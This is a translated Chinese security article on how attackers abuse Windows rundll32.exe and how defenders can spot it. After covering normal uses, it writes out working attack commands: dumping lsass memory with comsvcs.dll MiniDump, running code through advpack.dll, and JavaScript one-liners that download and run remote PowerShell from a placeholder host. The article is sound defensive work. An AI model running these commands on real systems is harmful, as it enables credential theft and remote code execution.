# 揭秘rundll32中的攻防对抗

##### 译文声明
本文为翻译文章，具体内容和含义请以原文为准。

## 前言
要具备高效的检测能力，首先必须深入了解你的系统环境。只有充分掌握正常行为模式，才能准确识别异常（Anomaly）和威胁（Threat）。在[上一篇文章](https://www.anquanke.com/post/id/262742)中，我们讨论了Cobalt Strike的一些行为特征，并多次提到了rundll32.exe。即使对于非安全人员来说，这个进程也并不陌生。

顾名思义，rundll32.exe可以执行DLL文件并调用其中的函数。其历史可追溯至Windows 95，是几乎所有Windows操作系统的核心组件之一，难以轻易禁用。攻击者常利用rundll32.exe加载恶意代码到DLL文件中，从而避免像其他EXE文件那样直接暴露在进程树中。此外，攻击者还可能滥用合法DLL文件中的导出函数，如即将介绍的comsvcs.dll和MiniDump。除了加载DLL文件外，rundll32.exe还可以通过RunHtmlApplication函数执行JavaScript。由于这些特性，rundll32.exe成为了攻击者的常用工具，在攻击技术流行度排行榜中名列前茅。

## 常见使用场景
最简单的rundll32.exe用法是直接指定文件名称来执行目标DLL：
```
rundll32.exe <DLL文件路径>
```

然而，在日常操作中，更常见的是通过rundll32.exe调用特定DLL文件中的函数：
```
rundll32.exe <DLL文件路径>,<函数名> <参数>
```

例如，右键点击某个文档并选择“打开方式”，实际上是在后台执行以下命令：
```
C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,OpenAs_RunDLL <文件路径>
```

以修改hosts文件为例，通过WIN+R运行以下命令即可弹出选择窗口：
```
C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,OpenAs_RunDLL C:\Windows\System32\drivers\etc\hosts
```

在日志中，这种行为通常会显示如下：
```
C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,OpenAs_RunDLL C:\Windows\System32\drivers\etc\hosts
```

关于shell32.dll，常见的函数还包括`Control_RunDLL`和`Control_RunDLLAsUser`，用于运行.CPL文件，通常是控制面板中的小程序。例如，打开防火墙：
```
C:\WINDOWS\System32\rundll32.exe C:\WINDOWS\System32\shell32.dll,Control_RunDLL C:\WINDOWS\System32\firewall.cpl
```

显然，这里的CPL文件也可以被替换为恶意文件，因此一旦出现可疑路径或文件名，就需要结合其他工具进行合法性检查。有关这一攻击手法的详细信息，请参阅这篇[论文](https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf)。这里有一张[表格](https://www.tenforums.com/tutorials/77458-rundll32-commands-list-windows-10-a.html)，列出了Windows 10上rundll32.exe可快速调用的命令及其功能说明。

## 攻击方式
借助rundll32.exe实现的攻击方式多种多样，以下仅简要介绍几种较为典型的利用方法。

### 合法DLL调用
如果攻击者使用合法的DLL文件进行攻击活动，传统检测手段将面临较大挑战。例如，利用comsvcs.dll中的MiniDump函数对目标进程进行内存转储，从而窃取凭证，具体操作如下：
```
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump C:\temp\lsass.dmp full
```

类似的还有advpack.dll，原本用于帮助硬件和软件读取和验证.INF文件，但也可被攻击者用于代码执行。一些木马病毒就曾使用过这种技巧，相关[文章](https://www.anquanke.com/post/id/97329/)中有详细介绍：
```
c:\windows\system32\rundll32.exe advpack.dll,LaunchINFSection c:\microsoft\360666.png,DefaultInstall
```

这些攻击手法在实际应用中会有许多变种，以绕过常规检测。例如，MiniDump函数的调用也可以通过编号#24完成。更多内容请参阅这篇[文章](http://www.hexacorn.com/blog/2020/02/05/stay-positive-lolbins-not/)。

### 远程代码加载
除了本地加载外，rundll32.exe还可以通过RunHtmlApplication函数执行JavaScript，实现远程代码加载。例如：
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');");
```
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/XXX/XXX")
```

根据观察，目前在日常活动中很少见到合理使用javascript关键字的情况，因此通常会将其作为检测特征。更多相关内容请参阅这篇[文章](https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/)。

### 滥用COM组件
rundll32.exe还有一些较少见的命令行参数——`-sta`和`-localserver`，它们可用于加载恶意注册的COM组件。